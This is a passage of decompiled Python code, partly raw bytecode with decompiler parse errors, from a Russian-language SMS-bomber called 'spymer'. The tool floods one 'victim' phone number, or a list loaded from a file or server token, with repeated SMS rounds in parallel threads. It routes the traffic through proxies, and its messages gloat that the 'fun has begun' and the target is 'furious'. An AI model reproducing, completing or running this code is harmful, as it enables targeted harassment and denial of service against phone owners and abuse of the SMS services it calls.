                                    info = Fore.RED + '\nНомер телефона находится в антиспам листе.' + Style.RESET_ALL
                                elif int(id) == 0:
                                    addparams()
                                    info = '\nЖертва: {}\\Жёсткость: {}'.format(phone, count) + '\nВеселье началось!\nЕсли хочешь остановить - нажмите Ctrl+Z.'
                                    clear()
                                    logo()
                                    print(info)
                                    if proxy == 'localhost':
                                        proxies = None
                                    else:
                                        proxies = {ssl: proxy}
                                    while True:
                                        if iteration < count:
                                            addparams()
                                            sms()
                                            iteration += 1
                                            print('{} круг пройден.'.format(iteration))

                                    info = Fore.BLUE + '\\Он в ярости!.\nТелефон: {}\nЖесткость: {}'.format(phone, iteration) + Style.RESET_ALL
                        except:
                            info = Fore.RED + 'Неверно введено кол-во кругов' + Style.RESET_ALL

                except:
                    info = Fore.RED + 'Неверно введен номер телефона' + Style.RESET_ALL

            def filesend--- This code section failed: ---

 L. 842         0  LOAD_DEREF               'clear'
                2  CALL_FUNCTION_0       0  ''
                4  POP_TOP          

 L. 843         6  LOAD_DEREF               'logo'
                8  CALL_FUNCTION_0       0  ''
               10  POP_TOP          

 L. 844        12  LOAD_GLOBAL              print
               14  LOAD_GLOBAL              info
               16  CALL_FUNCTION_1       1  ''
               18  POP_TOP          

 L. 845        20  LOAD_GLOBAL              print
               22  LOAD_STR                 'Введите путь к файлу: '
               24  CALL_FUNCTION_1       1  ''
               26  POP_TOP          

 L. 846        28  LOAD_GLOBAL              print
               30  LOAD_STR                 '(Папка с файлом должна находиться в домашней дирректории!)'
               32  CALL_FUNCTION_1       1  ''
               34  POP_TOP          

 L. 847        36  LOAD_GLOBAL              input
               38  LOAD_DEREF               'Fore'
               40  LOAD_ATTR                BLUE
               42  LOAD_STR                 'suckinator > '
               44  BINARY_ADD       
               46  LOAD_DEREF               'Style'
               48  LOAD_ATTR                RESET_ALL
               50  BINARY_ADD       
               52  LOAD_STR                 '~/'
               54  BINARY_ADD       
               56  CALL_FUNCTION_1       1  ''
               58  STORE_FAST               'f_name'

 L. 848        60  LOAD_DEREF               'clear'
               62  CALL_FUNCTION_0       0  ''
               64  POP_TOP          

 L. 849        66  LOAD_DEREF               'logo'
               68  CALL_FUNCTION_0       0  ''
               70  POP_TOP          

 L. 850        72  LOAD_GLOBAL              print
               74  LOAD_GLOBAL              info
               76  CALL_FUNCTION_1       1  ''
               78  POP_TOP          

 L. 851     80_82  SETUP_FINALLY       588  'to 588'

 L. 852        84  LOAD_GLOBAL              os
               86  LOAD_METHOD              chdir
               88  LOAD_GLOBAL              os
               90  LOAD_METHOD              getenv
               92  LOAD_STR                 'HOME'
               94  CALL_METHOD_1         1  ''
               96  CALL_METHOD_1         1  ''
               98  POP_TOP          

 L. 853       100  LOAD_GLOBAL              open
              102  LOAD_STR                 '{}'
              104  LOAD_METHOD              format
              106  LOAD_FAST                'f_name'
              108  CALL_METHOD_1         1  ''
              110  CALL_FUNCTION_1       1  ''
              112  STORE_FAST               'file'

 L. 854       114  LOAD_FAST                'file'
              116  LOAD_METHOD              read
              118  CALL_METHOD_0         0  ''
              120  LOAD_METHOD              splitlines
              122  CALL_METHOD_0         0  ''
              124  STORE_FAST               'array'

 L. 855       126  LOAD_FAST                'array'
              128  LOAD_CONST               -1
              130  BINARY_SUBSCR    
              132  LOAD_STR                 ''
              134  COMPARE_OP               ==
              136  POP_JUMP_IF_FALSE   146  'to 146'

 L. 856       138  LOAD_FAST                'array'
              140  LOAD_METHOD              pop
              142  CALL_METHOD_0         0  ''
              144  POP_TOP          
            146_0  COME_FROM           136  '136'

 L. 857       146  LOAD_GLOBAL              print
              148  LOAD_STR                 'Файл найден.\\Жертвы:\n{}'
              150  LOAD_METHOD              format
              152  LOAD_FAST                'array'
              154  CALL_METHOD_1         1  ''
              156  CALL_FUNCTION_1       1  ''
              158  POP_TOP          

 L. 858       160  LOAD_GLOBAL              print
              162  LOAD_STR                 'Введите жёсткость ("Enter" - отмена):'
              164  CALL_FUNCTION_1       1  ''
              166  POP_TOP          

 L. 859       168  LOAD_GLOBAL              input
              170  LOAD_DEREF               'Fore'
              172  LOAD_ATTR                BLUE
              174  LOAD_STR                 'suckinator > '
              176  BINARY_ADD       
              178  LOAD_DEREF               'Style'
              180  LOAD_ATTR                RESET_ALL
              182  BINARY_ADD       
              184  CALL_FUNCTION_1       1  ''
              186  STORE_FAST               'count'

 L. 860   188_190  SETUP_FINALLY       522  'to 522'

 L. 861       192  LOAD_GLOBAL              int
              194  LOAD_FAST                'count'
              196  CALL_FUNCTION_1       1  ''
          198_200  POP_JUMP_IF_FALSE   518  'to 518'

 L. 862       202  LOAD_GLOBAL              int
              204  LOAD_FAST                'count'
              206  CALL_FUNCTION_1       1  ''
              208  STORE_FAST               'count'

 L. 863       210  LOAD_STR                 '\nФайл: ~/{}\nКол-во кругов: {}'
              212  LOAD_METHOD              format
              214  LOAD_FAST                'f_name'
              216  LOAD_FAST                'count'
              218  CALL_METHOD_2         2  ''
              220  STORE_GLOBAL             info

 L. 864       222  LOAD_DEREF               'clear'
              224  CALL_FUNCTION_0       0  ''
              226  POP_TOP          

 L. 865       228  LOAD_DEREF               'logo'
              230  CALL_FUNCTION_0       0  ''
              232  POP_TOP          

 L. 866       234  LOAD_GLOBAL              print
              236  LOAD_GLOBAL              info
              238  CALL_FUNCTION_1       1  ''
              240  POP_TOP          

 L. 867       242  LOAD_FAST                'array'
              244  GET_ITER         
            246_0  COME_FROM           478  '478'
            246_1  COME_FROM           474  '474'
            246_2  COME_FROM           438  '438'
              246  FOR_ITER            480  'to 480'
              248  STORE_GLOBAL             phone

 L. 868       250  LOAD_DEREF               'make7phone'
              252  CALL_FUNCTION_0       0  ''
              254  POP_TOP          

 L. 869       256  LOAD_GLOBAL              proxy
              258  LOAD_STR                 'localhost'
              260  COMPARE_OP               ==
          262_264  POP_JUMP_IF_FALSE   272  'to 272'

 L. 870       266  LOAD_CONST               None
              268  STORE_GLOBAL             proxies
              270  JUMP_FORWARD        280  'to 280'
            272_0  COME_FROM           262  '262'

 L. 872       272  LOAD_GLOBAL              ssl
              274  LOAD_GLOBAL              proxy
              276  BUILD_MAP_1           1 
              278  STORE_GLOBAL             proxies
            280_0  COME_FROM           270  '270'

 L. 873       280  SETUP_FINALLY       440  'to 440'

 L. 874       282  LOAD_GLOBAL              int
              284  LOAD_GLOBAL              phone
              286  CALL_FUNCTION_1       1  ''
          288_290  POP_JUMP_IF_FALSE   436  'to 436'

 L. 875       292  LOAD_DEREF               'requests'
              294  LOAD_ATTR                post
              296  LOAD_STR                 'https://fsystem88.ru/spymer/json.php'
              298  LOAD_STR                 'phone'
              300  LOAD_GLOBAL              phone
              302  BUILD_MAP_1           1 
              304  LOAD_CONST               ('data',)
              306  CALL_FUNCTION_KW_2     2  '2 total positional and keyword args'
              308  LOAD_METHOD              json
              310  CALL_METHOD_0         0  ''
              312  LOAD_STR                 'id'
              314  BINARY_SUBSCR    
              316  STORE_FAST               'id'

 L. 876       318  LOAD_GLOBAL              int
              320  LOAD_FAST                'id'
              322  CALL_FUNCTION_1       1  ''
              324  LOAD_CONST               0
              326  COMPARE_OP               >
          328_330  POP_JUMP_IF_FALSE   366  'to 366'

 L. 877       332  LOAD_GLOBAL              print
              334  LOAD_DEREF               'Fore'
              336  LOAD_ATTR                RED
              338  LOAD_STR                 '\nНомер телефона {} находится в антиспам листе.'
              340  LOAD_METHOD              format
              342  LOAD_GLOBAL              phone
              344  CALL_METHOD_1         1  ''
              346  BINARY_ADD       
              348  LOAD_DEREF               'Style'
              350  LOAD_ATTR                RESET_ALL
              352  BINARY_ADD       
              354  CALL_FUNCTION_1       1  ''
              356  POP_TOP          

 L. 878       358  LOAD_GLOBAL              exit
              360  CALL_FUNCTION_0       0  ''
              362  POP_TOP          
              364  JUMP_FORWARD        436  'to 436'
            366_0  COME_FROM           328  '328'

 L. 879       366  LOAD_GLOBAL              int
              368  LOAD_FAST                'id'
              370  CALL_FUNCTION_1       1  ''
              372  LOAD_CONST               0
              374  COMPARE_OP               ==
          376_378  POP_JUMP_IF_FALSE   436  'to 436'

 L. 880       380  LOAD_GLOBAL              print
              382  LOAD_STR                 '\nВеселье началось: {}.Если хочешь остановить - нажмите Ctrl+Z.'
              384  LOAD_METHOD              format
              386  LOAD_GLOBAL              phone
              388  CALL_METHOD_1         1  ''
              390  CALL_FUNCTION_1       1  ''
              392  POP_TOP          

 L. 881       394  BUILD_LIST_0          0 
              396  STORE_FAST               'thread_list'

 L. 882       398  LOAD_DEREF               'threading'
              400  LOAD_ATTR                Thread
              402  LOAD_DEREF               'n_send'
              404  LOAD_GLOBAL              phone
              406  LOAD_FAST                'count'
              408  LOAD_GLOBAL              proxies
              410  BUILD_TUPLE_3         3 
              412  LOAD_CONST               ('target', 'args')
              414  CALL_FUNCTION_KW_2     2  '2 total positional and keyword args'
              416  STORE_FAST               't'

 L. 883       418  LOAD_FAST                'thread_list'
              420  LOAD_METHOD              append
              422  LOAD_FAST                't'
              424  CALL_METHOD_1         1  ''
              426  POP_TOP          

 L. 884       428  LOAD_FAST                't'
              430  LOAD_METHOD              start
              432  CALL_METHOD_0         0  ''
              434  POP_TOP          
            436_0  COME_FROM           376  '376'
            436_1  COME_FROM           364  '364'
            436_2  COME_FROM           288  '288'
              436  POP_BLOCK        
              438  JUMP_BACK           246  'to 246'
            440_0  COME_FROM_FINALLY   280  '280'

 L. 885       440  POP_TOP          
              442  POP_TOP          
              444  POP_TOP          

 L. 886       446  LOAD_GLOBAL              print
              448  LOAD_DEREF               'Fore'
              450  LOAD_ATTR                RED
              452  LOAD_STR                 '\n"{}" не является номером телефона.'
              454  LOAD_METHOD              format
              456  LOAD_GLOBAL              phone
              458  CALL_METHOD_1         1  ''
              460  BINARY_ADD       
              462  LOAD_DEREF               'Style'
              464  LOAD_ATTR                RESET_ALL
              466  BINARY_ADD       
              468  CALL_FUNCTION_1       1  ''
              470  POP_TOP          
              472  POP_EXCEPT       
              474  JUMP_BACK           246  'to 246'
              476  END_FINALLY      
              478  JUMP_BACK           246  'to 246'
            480_0  COME_FROM           246  '246'

 L. 887       480  LOAD_DEREF               'threading'
              482  LOAD_METHOD              enumerate
              484  CALL_METHOD_0         0  ''
              486  GET_ITER         
            488_0  COME_FROM           514  '514'
            488_1  COME_FROM           502  '502'
              488  FOR_ITER            518  'to 518'
              490  STORE_FAST               'th'

 L. 888       492  LOAD_FAST                'th'
              494  LOAD_DEREF               'threading'
              496  LOAD_METHOD              currentThread
              498  CALL_METHOD_0         0  ''
              500  COMPARE_OP               !=
          502_504  POP_JUMP_IF_FALSE_BACK   488  'to 488'

 L. 889       506  LOAD_FAST                'th'
              508  LOAD_METHOD              join
              510  CALL_METHOD_0         0  ''
              512  POP_TOP          
          514_516  JUMP_BACK           488  'to 488'
            518_0  COME_FROM           488  '488'
            518_1  COME_FROM           198  '198'
              518  POP_BLOCK        
              520  JUMP_FORWARD        550  'to 550'
            522_0  COME_FROM_FINALLY   188  '188'

 L. 890       522  POP_TOP          
              524  POP_TOP          
              526  POP_TOP          

 L. 891       528  LOAD_DEREF               'Fore'
              530  LOAD_ATTR                RED
              532  LOAD_STR                 '\nНекорректно введено количество кругов!'
              534  BINARY_ADD       
              536  LOAD_DEREF               'Style'
              538  LOAD_ATTR                RESET_ALL
              540  BINARY_ADD       
              542  STORE_GLOBAL             info
              544  POP_EXCEPT       
              546  JUMP_FORWARD        550  'to 550'
              548  END_FINALLY      
            550_0  COME_FROM           546  '546'
            550_1  COME_FROM           520  '520'

 L. 893       550  LOAD_GLOBAL              print
              552  LOAD_DEREF               'Fore'
              554  LOAD_ATTR                BLUE
              556  LOAD_STR                 '\nГотово.\nФайл: {}\nЖесткость: {}'
              558  LOAD_METHOD              format
              560  LOAD_FAST                'f_name'
              562  LOAD_FAST                'count'
              564  CALL_METHOD_2         2  ''
              566  BINARY_ADD       
              568  LOAD_DEREF               'Style'
              570  LOAD_ATTR                RESET_ALL
              572  BINARY_ADD       
              574  CALL_FUNCTION_1       1  ''
              576  POP_TOP          

 L. 894       578  LOAD_GLOBAL              exit
              580  CALL_FUNCTION_0       0  ''
              582  POP_TOP          
              584  POP_BLOCK        
              586  JUMP_FORWARD        632  'to 632'
            588_0  COME_FROM_FINALLY    80  '80'

 L. 895       588  DUP_TOP          
              590  LOAD_GLOBAL              FileNotFoundError
              592  COMPARE_OP               exception-match
          594_596  POP_JUMP_IF_FALSE   630  'to 630'
              598  POP_TOP          
              600  POP_TOP          
              602  POP_TOP          

 L. 896       604  LOAD_DEREF               'Fore'
              606  LOAD_ATTR                RED
              608  LOAD_STR                 '\nФайл {} не найден'
              610  LOAD_METHOD              format
              612  LOAD_FAST                'f_name'
              614  CALL_METHOD_1         1  ''
              616  BINARY_ADD       
              618  LOAD_DEREF               'Style'
              620  LOAD_ATTR                RESET_ALL
              622  BINARY_ADD       
              624  STORE_GLOBAL             info
              626  POP_EXCEPT       
              628  JUMP_FORWARD        632  'to 632'
            630_0  COME_FROM           594  '594'
              630  END_FINALLY      
            632_0  COME_FROM           628  '628'
            632_1  COME_FROM           586  '586'

Parse error at or near `JUMP_BACK' instruction at offset 474

            def tokensend--- This code section failed: ---

 L. 907         0  LOAD_DEREF               'clear'
                2  CALL_FUNCTION_0       0  ''
                4  POP_TOP          

 L. 908         6  LOAD_DEREF               'logo'
                8  CALL_FUNCTION_0       0  ''
               10  POP_TOP          

 L. 909        12  LOAD_GLOBAL              print
               14  LOAD_GLOBAL              info
               16  CALL_FUNCTION_1       1  ''
               18  POP_TOP          

 L. 910        20  LOAD_GLOBAL              print
               22  LOAD_STR                 'Введите токен: '
               24  CALL_FUNCTION_1       1  ''
               26  POP_TOP          

 L. 911        28  LOAD_GLOBAL              print
               30  LOAD_STR                 'Загрузить файл и получить токен можно по ссылке:'
               32  CALL_FUNCTION_1       1  ''
               34  POP_TOP          

 L. 912        36  LOAD_GLOBAL              print
               38  LOAD_DEREF               'Fore'
               40  LOAD_ATTR                GREEN
               42  LOAD_STR                 'https://FSystem88.ru/spymer/\n'
               44  BINARY_ADD       
               46  LOAD_DEREF               'Style'
               48  LOAD_ATTR                RESET_ALL
               50  BINARY_ADD       
               52  CALL_FUNCTION_1       1  ''
               54  POP_TOP          

 L. 913        56  LOAD_GLOBAL              input
               58  LOAD_DEREF               'Fore'
               60  LOAD_ATTR                BLUE
               62  LOAD_STR                 'spymer > '
               64  BINARY_ADD       
               66  LOAD_DEREF               'Style'
               68  LOAD_ATTR                RESET_ALL
               70  BINARY_ADD       
               72  CALL_FUNCTION_1       1  ''
               74  STORE_FAST               'token'

 L. 914        76  LOAD_DEREF               'requests'
               78  LOAD_ATTR                post
               80  LOAD_STR                 'https://fsystem88.ru/spymer/spym.php'
               82  LOAD_STR                 'token'
               84  LOAD_FAST                'token'
               86  BUILD_MAP_1           1 
               88  LOAD_CONST               ('data',)
               90  CALL_FUNCTION_KW_2     2  '2 total positional and keyword args'
               92  LOAD_METHOD              json
               94  CALL_METHOD_0         0  ''
               96  LOAD_STR                 'id'
               98  BINARY_SUBSCR    
              100  STORE_FAST               'id'

 L. 915       102  LOAD_GLOBAL              int
              104  LOAD_FAST                'id'
              106  CALL_FUNCTION_1       1  ''
              108  LOAD_CONST               0
              110  COMPARE_OP               !=
          112_114  POP_JUMP_IF_FALSE   666  'to 666'

 L. 916       116  LOAD_DEREF               'requests'
              118  LOAD_METHOD              get
              120  LOAD_STR                 'https://fsystem88.ru/spymer/token/{}'
              122  LOAD_METHOD              format
              124  LOAD_FAST                'token'
              126  CALL_METHOD_1         1  ''
              128  CALL_METHOD_1         1  ''
              130  STORE_FAST               'req'

 L. 917       132  LOAD_STR                 ''
              134  STORE_GLOBAL             info

 L. 918       136  LOAD_DEREF               'clear'
              138  CALL_FUNCTION_0       0  ''
              140  POP_TOP          

 L. 919       142  LOAD_DEREF               'logo'
              144  CALL_FUNCTION_0       0  ''
              146  POP_TOP          

 L. 920       148  LOAD_GLOBAL              print
              150  LOAD_GLOBAL              info
              152  CALL_FUNCTION_1       1  ''
              154  POP_TOP          

 L. 921       156  LOAD_FAST                'req'
              158  LOAD_ATTR                text
              160  LOAD_METHOD              splitlines
              162  CALL_METHOD_0         0  ''
              164  STORE_FAST               'array'

 L. 922       166  LOAD_STR                 '<h1>Not Found</h1>'
              168  LOAD_FAST                'array'
              170  COMPARE_OP               in
              172  POP_JUMP_IF_FALSE   204  'to 204'

 L. 923       174  LOAD_DEREF               'Fore'
              176  LOAD_ATTR                RED
              178  LOAD_STR                 'Токен не найден на сервере.\n Загрузите файл и получите токен на сайте:\n'
              180  BINARY_ADD       
              182  LOAD_DEREF               'Fore'
              184  LOAD_ATTR                GREEN
              186  BINARY_ADD       
              188  LOAD_STR                 'https://FSystem88.ru/spymer'
              190  BINARY_ADD       
              192  LOAD_DEREF               'Style'
              194  LOAD_ATTR                RESET_ALL
              196  BINARY_ADD       
              198  STORE_GLOBAL             info
          200_202  JUMP_FORWARD        666  'to 666'
            204_0  COME_FROM           172  '172'

 L. 925       204  LOAD_FAST                'array'
              206  LOAD_CONST               -1
              208  BINARY_SUBSCR    
              210  LOAD_STR                 ''
              212  COMPARE_OP               ==
              214  POP_JUMP_IF_FALSE   224  'to 224'

 L. 926       216  LOAD_FAST                'array'
              218  LOAD_METHOD              pop
              220  CALL_METHOD_0         0  ''
              222  POP_TOP          
            224_0  COME_FROM           214  '214'

 L. 927       224  LOAD_GLOBAL              print
              226  LOAD_STR                 'Файл загружен успешно.\nТелефоны:\n{}'
              228  LOAD_METHOD              format
              230  LOAD_FAST                'req'
              232  LOAD_ATTR                text
              234  CALL_METHOD_1         1  ''
              236  CALL_FUNCTION_1       1  ''
              238  POP_TOP          

 L. 928       240  LOAD_GLOBAL              print
              242  LOAD_STR                 'Введите количество кругов ("Enter" - отмена):'
              244  CALL_FUNCTION_1       1  ''
              246  POP_TOP          

 L. 929       248  LOAD_GLOBAL              input
              250  LOAD_DEREF               'Fore'
              252  LOAD_ATTR                BLUE
              254  LOAD_STR                 'spymer > '
              256  BINARY_ADD       
              258  LOAD_DEREF               'Style'
              260  LOAD_ATTR                RESET_ALL
              262  BINARY_ADD       
              264  CALL_FUNCTION_1       1  ''
              266  STORE_FAST               'count'

 L. 930   268_270  SETUP_FINALLY       604  'to 604'

 L. 931       272  LOAD_GLOBAL              int
              274  LOAD_FAST                'count'
              276  CALL_FUNCTION_1       1  ''
          278_280  POP_JUMP_IF_FALSE   600  'to 600'

 L. 932       282  LOAD_GLOBAL              int
              284  LOAD_FAST                'count'
              286  CALL_FUNCTION_1       1  ''
              288  STORE_FAST               'count'

 L. 933       290  LOAD_STR                 '\nТокен: {}\nКол-во кругов: {}'
              292  LOAD_METHOD              format
              294  LOAD_FAST                'token'
              296  LOAD_FAST                'count'
              298  CALL_METHOD_2         2  ''
              300  STORE_GLOBAL             info

 L. 934       302  LOAD_DEREF               'clear'
              304  CALL_FUNCTION_0       0  ''
              306  POP_TOP          

 L. 935       308  LOAD_DEREF               'logo'
              310  CALL_FUNCTION_0       0  ''
              312  POP_TOP          

 L. 936       314  LOAD_GLOBAL              print
              316  LOAD_GLOBAL              info
              318  CALL_FUNCTION_1       1  ''
              320  POP_TOP          

 L. 937       322  LOAD_FAST                'array'
              324  GET_ITER         
            326_0  COME_FROM           558  '558'
            326_1  COME_FROM           554  '554'
            326_2  COME_FROM           518  '518'
              326  FOR_ITER            562  'to 562'
              328  STORE_GLOBAL             phone

 L. 938       330  LOAD_DEREF               'make7phone'
              332  CALL_FUNCTION_0       0  ''
              334  POP_TOP          

 L. 939       336  LOAD_GLOBAL              proxy
              338  LOAD_STR                 'localhost'
              340  COMPARE_OP               ==
          342_344  POP_JUMP_IF_FALSE   352  'to 352'

 L. 940       346  LOAD_CONST               None
              348  STORE_GLOBAL             proxies
              350  JUMP_FORWARD        360  'to 360'
            352_0  COME_FROM           342  '342'

 L. 942       352  LOAD_GLOBAL              ssl
              354  LOAD_GLOBAL              proxy
              356  BUILD_MAP_1           1 
              358  STORE_GLOBAL             proxies
            360_0  COME_FROM           350  '350'

 L. 943       360  SETUP_FINALLY       520  'to 520'

 L. 944       362  LOAD_GLOBAL              int
              364  LOAD_GLOBAL              phone
              366  CALL_FUNCTION_1       1  ''
          368_370  POP_JUMP_IF_FALSE   516  'to 516'

 L. 945       372  LOAD_DEREF               'requests'
              374  LOAD_ATTR                post
              376  LOAD_STR                 'https://fsystem88.ru/spymer/json.php'
              378  LOAD_STR                 'phone'
              380  LOAD_GLOBAL              phone
              382  BUILD_MAP_1           1 
              384  LOAD_CONST               ('data',)
              386  CALL_FUNCTION_KW_2     2  '2 total positional and keyword args'
              388  LOAD_METHOD              json
              390  CALL_METHOD_0         0  ''
              392  LOAD_STR                 'id'
              394  BINARY_SUBSCR    
              396  STORE_FAST               'id'

 L. 946       398  LOAD_GLOBAL              int
              400  LOAD_FAST                'id'
              402  CALL_FUNCTION_1       1  ''
              404  LOAD_CONST               0
              406  COMPARE_OP               >
          408_410  POP_JUMP_IF_FALSE   446  'to 446'

 L. 947       412  LOAD_GLOBAL              print
              414  LOAD_DEREF               'Fore'
              416  LOAD_ATTR                RED
              418  LOAD_STR                 '\nНомер телефона {} находится в антиспам листе.'
              420  LOAD_METHOD              format
              422  LOAD_GLOBAL              phone
              424  CALL_METHOD_1         1  ''
              426  BINARY_ADD       
              428  LOAD_DEREF               'Style'
              430  LOAD_ATTR                RESET_ALL
              432  BINARY_ADD       
              434  CALL_FUNCTION_1       1  ''
              436  POP_TOP          

 L. 948       438  LOAD_GLOBAL              exit
              440  CALL_FUNCTION_0       0  ''
              442  POP_TOP          
              444  JUMP_FORWARD        516  'to 516'
            446_0  COME_FROM           408  '408'

 L. 949       446  LOAD_GLOBAL              int
              448  LOAD_FAST                'id'
              450  CALL_FUNCTION_1       1  ''
              452  LOAD_CONST               0
              454  COMPARE_OP               ==
          456_458  POP_JUMP_IF_FALSE   516  'to 516'

 L. 950       460  LOAD_GLOBAL              print
              462  LOAD_STR                 '\nЗапущен спам на {}.Если хочешь остановить - нажмите Ctrl+Z.'
              464  LOAD_METHOD              format
              466  LOAD_GLOBAL              phone
              468  CALL_METHOD_1         1  ''
              470  CALL_FUNCTION_1       1  ''
              472  POP_TOP          

 L. 951       474  BUILD_LIST_0          0 
              476  STORE_FAST               'thread_list'

 L. 952       478  LOAD_DEREF               'threading'
              480  LOAD_ATTR                Thread
              482  LOAD_DEREF               'n_send'
              484  LOAD_GLOBAL              phone
              486  LOAD_FAST                'count'
              488  LOAD_GLOBAL              proxies
              490  BUILD_TUPLE_3         3 
              492  LOAD_CONST               ('target', 'args')
              494  CALL_FUNCTION_KW_2     2  '2 total positional and keyword args'
              496  STORE_FAST               't'

 L. 953       498  LOAD_FAST                'thread_list'
              500  LOAD_METHOD              append
              502  LOAD_FAST                't'
              504  CALL_METHOD_1         1  ''
              506  POP_TOP          

 L. 954       508  LOAD_FAST                't'
              510  LOAD_METHOD              start
              512  CALL_METHOD_0         0  ''
              514  POP_TOP          
            516_0  COME_FROM           456  '456'
            516_1  COME_FROM           444  '444'
            516_2  COME_FROM           368  '368'
              516  POP_BLOCK        
              518  JUMP_BACK           326  'to 326'
            520_0  COME_FROM_FINALLY   360  '360'

 L. 955       520  POP_TOP          
              522  POP_TOP          
              524  POP_TOP          

 L. 956       526  LOAD_GLOBAL              print
              528  LOAD_DEREF               'Fore'
              530  LOAD_ATTR                RED
              532  LOAD_STR                 '\n"{}" не является номером телефона.'
              534  LOAD_METHOD              format
              536  LOAD_GLOBAL              phone
              538  CALL_METHOD_1         1  ''
              540  BINARY_ADD       
              542  LOAD_DEREF               'Style'
              544  LOAD_ATTR                RESET_ALL
              546  BINARY_ADD       
              548  CALL_FUNCTION_1       1  ''
              550  POP_TOP          
              552  POP_EXCEPT       
              554  JUMP_BACK           326  'to 326'
              556  END_FINALLY      
          558_560  JUMP_BACK           326  'to 326'
            562_0  COME_FROM           326  '326'

 L. 957       562  LOAD_DEREF               'threading'
              564  LOAD_METHOD              enumerate
              566  CALL_METHOD_0         0  ''
              568  GET_ITER         
            570_0  COME_FROM           596  '596'
            570_1  COME_FROM           584  '584'
              570  FOR_ITER            600  'to 600'
              572  STORE_FAST               'th'

 L. 958       574  LOAD_FAST                'th'
              576  LOAD_DEREF               'threading'
              578  LOAD_METHOD              currentThread
              580  CALL_METHOD_0         0  ''
              582  COMPARE_OP               !=
          584_586  POP_JUMP_IF_FALSE_BACK   570  'to 570'

 L. 959       588  LOAD_FAST                'th'
              590  LOAD_METHOD              join
              592  CALL_METHOD_0         0  ''
              594  POP_TOP          
          596_598  JUMP_BACK           570  'to 570'
            600_0  COME_FROM           570  '570'
            600_1  COME_FROM           278  '278'
              600  POP_BLOCK        
              602  JUMP_FORWARD        632  'to 632'
            604_0  COME_FROM_FINALLY   268  '268'

 L. 960       604  POP_TOP          
              606  POP_TOP          
              608  POP_TOP          

 L. 961       610  LOAD_DEREF               'Fore'
              612  LOAD_ATTR                RED
              614  LOAD_STR                 '\nНекорректно введено количество кругов!'
              616  BINARY_ADD       
              618  LOAD_DEREF               'Style'
              620  LOAD_ATTR                RESET_ALL
              622  BINARY_ADD       
              624  STORE_GLOBAL             info
              626  POP_EXCEPT       
              628  JUMP_FORWARD        632  'to 632'
              630  END_FINALLY      
            632_0  COME_FROM           628  '628'
            632_1  COME_FROM           602  '602'

 L. 963       632  LOAD_GLOBAL              print
              634  LOAD_DEREF               'Fore'
              636  LOAD_ATTR                BLUE
              638  LOAD_STR                 '\nГотово.\nТокен: {}\nКол-во кругов: {}\n'
              640  LOAD_METHOD              format
              642  LOAD_FAST                'token'
              644  LOAD_FAST                'count'
              646  CALL_METHOD_2         2  ''
              648  BINARY_ADD       
              650  LOAD_DEREF               'Style'
              652  LOAD_ATTR                RESET_ALL
              654  BINARY_ADD       
              656  CALL_FUNCTION_1       1  ''
              658  POP_TOP          

 L. 964       660  LOAD_GLOBAL              exit
              662  CALL_FUNCTION_0       0  ''
              664  POP_TOP          
            666_0  COME_FROM           200  '200'
            666_1  COME_FROM           112  '112'

Parse error at or near `JUMP_BACK' instruction at offset 554

            def n_send(phone, count, proxies):
                iteration = 0
                while True:
                    if iteration < count:
                        addparams()
                        sms()
                        iteration += 1
                        print(Fore.GREEN + '{}'.format(phone) + Style.RESET_ALL + ': круг №{} пройден.'.format(iteration))

                print(Fore.GREEN + '\nСпам на {} закончен. Кол-во кругов {}'.format(phone, count) + Style.RESET_ALL)
                exit()

            def main():
                global info
                global proxy
                proxy = 'localhost'
                info = ' '
                while True:
                    clear()
                    logo()
                    print(info)
                    checkver()
                    print('Proxy: ' + Fore.BLUE + '{}'.format(proxy) + Style.RESET_ALL)
                    print(Fore.GREEN + '1)То что тебе нужно)')
                    print(Fore.WHITE + '2) Обновить прокси.')
                    print(Fore.RED + '3) Выход.')
                    input1 = input(Fore.BLUE + 'Введите номер пункта: ' + Style.RESET_ALL)
                    if input1 == '1':
                        clear()
                        logo()
                        print(info)
                        print('Выберите один вариант:')
                        print('1. Запустить спамер на один номер')
                        print('2. Выгрузить номера из TXT файла ')
                        input11 = input(Fore.BLUE + 'spymer > ' + Style.RESET_ALL)
                        if input11 == '1':
                            onesend()
                        elif input11 == '2':
                            filesend()
                        else:
                            print('Некорректно')
                    else:
                        if input1 == '4':
                            checkspamlist()
                        else:
                            if input1 == '6':
                                addantispam()
                            else:
                                if input1 == '2':
                                    print('1. Удалить прокси')
                                    print('2. Ввести свой прокси')
                                    print('3. Сгенерировать прокси')
                                    input51 = input(Fore.BLUE + 'spymer > ' + Style.RESET_ALL)
                                    if input51 == '1':
                                        proxy = 'localhost'
                                    elif input51 == '2':
                                        updateproxy()
                                    elif input51 == '3':
                                        generateproxy()
                                else:
                                    if input1 == '5':
                                        update()
                                    else:
                                        if input1 == '3':
                                            print(Fore.GREEN + '\nДавай пока)\n' + Style.RESET_ALL)
                                            exit()

            main()

        Main()
    except ModuleNotFoundError:
        os.system('cls' if os.name == 'nt' else 'clear')
        print('Нажмите Enter чтобы установить недостающие библиотеки...')
        input()
        os.system('python -m pip install requests colorama proxyscrape')
        MAIN()


MAIN()